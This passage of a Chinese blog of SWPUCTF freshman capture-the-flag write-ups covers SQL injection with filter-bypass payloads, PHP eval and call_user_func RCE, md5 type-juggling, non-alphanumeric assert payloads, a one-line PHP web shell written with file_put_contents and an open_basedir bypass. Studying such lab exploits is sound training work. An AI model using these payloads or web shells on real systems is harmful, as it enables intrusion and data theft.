<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$pop</span>);
<span class="hljs-meta">?&gt;</span>

<span class="hljs-comment">//O:1:"X":1:{s:1:"x";s:13:"fllllllag.php";}</span>
   <span class="hljs-comment">// 改为</span>
<span class="hljs-comment">//O:1:"X":3:{s:1:"x";s:13:"fllllllag.php";}</span></code></pre>
<h1 id="swpuctf-2022-新生赛where_am_i">[SWPUCTF 2022 新生赛]where_am_i</h1>
<p>这道题没想到是社工学，虽然知道11位大概率是电话号。。。这里昨晚才反应过来，题目也提示过（我在哪）</p>
<p>根据wp，这里有图片地址，直接百度识图看看</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240309160026069.png" alt="image-20240309160026069"></p>
<p>发现是成都山水间 古迹酒店，直接百度搜一手</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240309160236384.png" alt="image-20240309160236384"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240309160245118.png" alt="image-20240309160245118"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240309160218939.png" alt="image-20240309160218939"></p>
<h1 id="swpuctf-2022-新生赛js_sign">[SWPUCTF 2022 新生赛]js_sign</h1>
<p>又是一个新知识，敲击码：<a target="_blank" rel="noopener" href="https://ctf-wiki.org/misc/encode/communication/">通信领域常用编码 </a>，看了一下感觉挺简单，就是对号入座，接下来看源码</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240309161511392.png" alt="image-20240309161511392"></p>
<p>解码得到：tapcode也就是tap code：敲击码，对应工具为：<a target="_blank" rel="noopener" href="http://www.hiencode.com/tapcode.html">http://www.hiencode.com/tapcode.html</a></p>
<p>接着将flag的值，中间空格去掉，放进去解密即可：NSSCTF{youfindflagbytapcode}</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240309161604787.png" alt="image-20240309161604787"></p>
<h1 id="swpuctf-2022-新生赛xff">[SWPUCTF 2022 新生赛]xff</h1>
<p>修改xff以及referer头即可</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240309161936041.png" alt="image-20240309161936041"></p>
<h1 id="swpuctf-2022-新生赛numgame">[SWPUCTF 2022 新生赛]numgame</h1>
<p>发现查看源码、F12什么的都禁了，直接上bp抓一下</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240309162236676.png" alt="image-20240309162236676"></p>
<p>发现多个可以js文件，访问一下，以为是flag，解码看看：NsScTf.php</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240309162256195.png" alt="image-20240309162256195"></p>
<p>访问页面</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
<span class="hljs-comment">//hint: 与get相似的另一种请求协议是什么呢</span>
<span class="hljs-keyword">include</span>(<span class="hljs-string">"flag.php"</span>);
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">nss</span></span>{
    <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ctf</span>(<span class="hljs-params"></span>)</span>{
        <span class="hljs-keyword">include</span>(<span class="hljs-string">"./hint2.php"</span>);
    }
}
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'p'</span>])){
    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">"/n|c/m"</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'p'</span>], <span class="hljs-variable">$matches</span>))
        <span class="hljs-keyword">die</span>(<span class="hljs-string">"no"</span>);
    <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'p'</span>]);
}<span class="hljs-keyword">else</span>{
    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
}</code></pre>
<p>这道题感觉有点脑洞了，我想不到。。。这里第二个提示为：有没有可能类是nss2呢。</p>
<p>这里重点函数肯定是call_user_func了，搜一下用法</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240309163418985.png" alt="image-20240309163418985"></p>
<p>当然也可以看这个</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240309163438380.png" alt="image-20240309163438380"></p>
<p>也就是说我们可以通过这个函数调用某些方法，结合他说真正的类是nss2，而nss类中有一个ctf方法，那我们可以尝试</p>
<p><code>nss2::ctf</code>，当然再结合第一个提示说：与get类似的传参方式是什么呢？肯定是post了，说明需要post传参p</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240309163556215.png" alt="image-20240309163556215"></p>
<p>最后查看源码即可</p>
<h1 id="swpuctf-2022-新生赛ez_sql">[SWPUCTF 2022 新生赛]ez_sql</h1>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240309163728434.png" alt="image-20240309163728434"></p>
<p>刚开始说让我们用相对安全的传参方式：肯定是post，接着我给nss随便传了个内容，发现两个fake flag。。。。</p>
<p>接着就是常规SQL手工注入了，这里不断fuzz发现过滤了order、union、空格，不过都可以双写绕过，后面的用内联注释绕过即可</p>
<pre><code class="hljs scss">nss=<span class="hljs-number">2</span>'<span class="hljs-comment">/**/</span>uunionnion<span class="hljs-comment">/**/</span>select<span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-built_in">database</span>(),<span class="hljs-number">3</span># 

nss=<span class="hljs-number">2</span>'<span class="hljs-comment">/**/</span>uunionnion<span class="hljs-comment">/**/</span>select<span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-built_in">group_concat</span>(table_name),<span class="hljs-number">3</span><span class="hljs-comment">/**/</span>from<span class="hljs-comment">/**/</span>infoorrmation_schema<span class="hljs-selector-class">.tables</span><span class="hljs-comment">/**/</span>where<span class="hljs-comment">/**/</span>table_schema='NSS_db'#

nss=<span class="hljs-number">2</span>'<span class="hljs-comment">/**/</span>uunionnion<span class="hljs-comment">/**/</span>select<span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-built_in">group_concat</span>(column_name),<span class="hljs-number">3</span><span class="hljs-comment">/**/</span>from<span class="hljs-comment">/**/</span>infoorrmation_schema<span class="hljs-selector-class">.columns</span><span class="hljs-comment">/**/</span>where<span class="hljs-comment">/**/</span>table_name='NSS_tb'#

nss=<span class="hljs-number">2</span>'<span class="hljs-comment">/**/</span>uunionnion<span class="hljs-comment">/**/</span>select<span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-built_in">group_concat</span>(Secr3t),<span class="hljs-number">3</span><span class="hljs-comment">/**/</span>from<span class="hljs-comment">/**/</span>NSS_tb#</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240309165918346.png" alt="image-20240309165918346"></p>
<h1 id="swpuctf-2022-新生赛webdog1__start">[SWPUCTF 2022 新生赛]webdog1__start</h1>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240309170643719.png" alt="image-20240309170643719"></p>
<p>看到源码有这一处地方，要求md5加密后等于自身，那找一个0e开头的字符串即可：?web=0e215962017</p>
<p>接着继续看源码，箭头处可以联想到robots.txt</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240309170924979.png" alt="image-20240309170924979"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240309170949358.png" alt="image-20240309170949358"></p>
<p>继续访问，看到响应包的提示，继续访问</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240309171205453.png" alt="image-20240309171205453"></p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'get'</span>])){
    <span class="hljs-variable">$get</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'get'</span>];
    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-variable">$get</span>,<span class="hljs-string">" "</span>)){
        <span class="hljs-variable">$get</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">"flag"</span>, <span class="hljs-string">" "</span>, <span class="hljs-variable">$get</span>);
        
        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$get</span>)&gt;<span class="hljs-number">18</span>){
            <span class="hljs-keyword">die</span>(<span class="hljs-string">"This is too long."</span>);
            }
            
            <span class="hljs-keyword">else</span>{
                <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$get</span>);
          } 
    }<span class="hljs-keyword">else</span> {
        <span class="hljs-keyword">die</span>(<span class="hljs-string">"nonono"</span>); 
    }
}
<span class="hljs-meta">?&gt;</span></code></pre>
<pre><code class="hljs scss">?get=<span class="hljs-built_in">eval</span>($_POST[a]);
<span class="hljs-comment">//post</span>
<span class="hljs-selector-tag">a</span>=<span class="hljs-built_in">system</span>('cat /flag');
<span class="hljs-comment">//也可以直接</span>
<span class="hljs-built_in">system</span>("nl%<span class="hljs-number">09</span>/*");</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240309171612435.png" alt="image-20240309171612435"></p>
<h1 id="swpuctf-2022-新生赛funny_php">[SWPUCTF 2022 新生赛]funny_php</h1>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
    <span class="hljs-title function_ invoke__">session_start</span>();
    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'num'</span>])){
        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'num'</span>])&lt;=<span class="hljs-number">3</span>&amp;&amp;<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'num'</span>]&gt;<span class="hljs-number">999999999</span>){
            <span class="hljs-keyword">echo</span> <span class="hljs-string">":D"</span>;
            <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'L1'</span>] = <span class="hljs-number">1</span>;
        }<span class="hljs-keyword">else</span>{
            <span class="hljs-keyword">echo</span> <span class="hljs-string">":C"</span>;
        }
    }
    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'str'</span>])){
        <span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">'/NSSCTF/'</span>,<span class="hljs-string">""</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'str'</span>]);
        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$str</span> === <span class="hljs-string">"NSSCTF"</span>){
            <span class="hljs-keyword">echo</span> <span class="hljs-string">"wow"</span>;
            <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'L2'</span>] = <span class="hljs-number">1</span>;
        }<span class="hljs-keyword">else</span>{
            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$str</span>;
        }
    }
    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'md5_1'</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'md5_2'</span>])){
        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'md5_1'</span>]!==<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'md5_2'</span>]&amp;&amp;<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'md5_1'</span>])==<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'md5_2'</span>])){
            <span class="hljs-keyword">echo</span> <span class="hljs-string">"Nice!"</span>;
            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'md5_1'</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'md5_2'</span>])){
                <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'md5_1'</span>])&amp;&amp;<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'md5_2'</span>])){
                    <span class="hljs-keyword">echo</span> <span class="hljs-string">"yoxi!"</span>;
                    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'L3'</span>] = <span class="hljs-number">1</span>;
                }<span class="hljs-keyword">else</span>{
                    <span class="hljs-keyword">echo</span> <span class="hljs-string">"X("</span>;
                }
            }
        }<span class="hljs-keyword">else</span>{
            <span class="hljs-keyword">echo</span> <span class="hljs-string">"G"</span>;
            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$_POST</span>[<span class="hljs-string">'md5_1'</span>].<span class="hljs-string">"\n"</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'md5_2'</span>];
        }
    }
    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'L1'</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'L2'</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'L3'</span>])){
        <span class="hljs-keyword">include</span>(<span class="hljs-string">'flag.php'</span>);
        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;
    }
<span class="hljs-meta">?&gt;</span></code></pre>
<p>第一个指数绕过、第二个双写绕过、第三个找字符串在md5加密后0e开头的即可</p>
<pre><code class="hljs scss">?num=<span class="hljs-number">9</span>e9&amp;str=NSSNSSCTFCTF
md5_1=s878926199a&amp;md5_2=s155964671a</code></pre>
<h1 id="swpuctf-2021-新生赛hardrce_3">[SWPUCTF 2021 新生赛]hardrce_3</h1>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">"Content-Type:text/html;charset=utf-8"</span>);
<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'wllm'</span>]))
{
    <span class="hljs-variable">$wllm</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'wllm'</span>];
    <span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">' '</span>,<span class="hljs-string">'\^'</span>,<span class="hljs-string">'\~'</span>,<span class="hljs-string">'\|'</span>];
    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blackitem</span>)
    {
        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/'</span> . <span class="hljs-variable">$blackitem</span> . <span class="hljs-string">'/m'</span>, <span class="hljs-variable">$wllm</span>)) {
        <span class="hljs-keyword">die</span>(<span class="hljs-string">"小伙子只会异或和取反？不好意思哦LTLT说不能用！！"</span>);
    }}
<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/[a-zA-Z0-9]/is'</span>,<span class="hljs-variable">$wllm</span>))
{
    <span class="hljs-keyword">die</span>(<span class="hljs-string">"Ra'sAlGhul说用字母数字是没有灵魂的！"</span>);
}
<span class="hljs-keyword">echo</span> <span class="hljs-string">"NoVic4说：不错哦小伙子，可你能拿到flag吗？"</span>;
<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$wllm</span>);
}
<span class="hljs-keyword">else</span>
{
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"蔡总说：注意审题！！！"</span>;
}
<span class="hljs-meta">?&gt;</span> NoVic4说：不错哦小伙子，可你能拿到flag吗？</code></pre>
<p>这里吧取反、异或都过滤了，但我们可以用自增，固定格式如下：</p>
<pre><code class="hljs scss">$_=<span class="hljs-selector-attr">[]</span>;$_=@<span class="hljs-string">"$_"</span>;$_=$_<span class="hljs-selector-attr">[<span class="hljs-string">'!'</span>==<span class="hljs-string">'@'</span>]</span>;$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____='_';$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$<span class="hljs-built_in">___</span>($_[_]);
这是固定格式构造出来的 <span class="hljs-built_in">assert</span>($_POST[_]);
然后post传入 _=<span class="hljs-built_in">phpinfo</span>();
使用时需要url编码.</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240309180110365.png" alt="image-20240309180110365"></p>
<p>可以看到过滤了很多命令执行函数，但没有过滤file_put_contents函数，我们直接写马即可</p>
<pre><code class="hljs php">_=<span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">'shell.php'</span>,<span class="hljs-string">'&lt;?php @eval($_POST[1]);?&gt;'</span>);</code></pre>
<p>之后蚁剑连接（这里开始一直报错，不知道为何，也不是代理啥的问题，结果等了一会儿突然又行了）</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240310154828298.png" alt="image-20240310154828298"></p>
<p>不过这里也可以用其他办法，但如果不是上述令写马的方式，则需要绕过disable_funtions限制</p>
<p>也可以用下面的绕过open_basedir的方法</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-string">'sub'</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">'sub'</span>);<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">'open_basedir'</span>,<span class="hljs-string">'..'</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">'..'</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">'..'</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">'..'</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">'..'</span>);<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">'open_basedir'</span>,<span class="hljs-string">'/'</span>);<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">'/'</span>));<span class="hljs-meta">?&gt;</span> <span class="hljs-comment">//列举根目录</span>
    
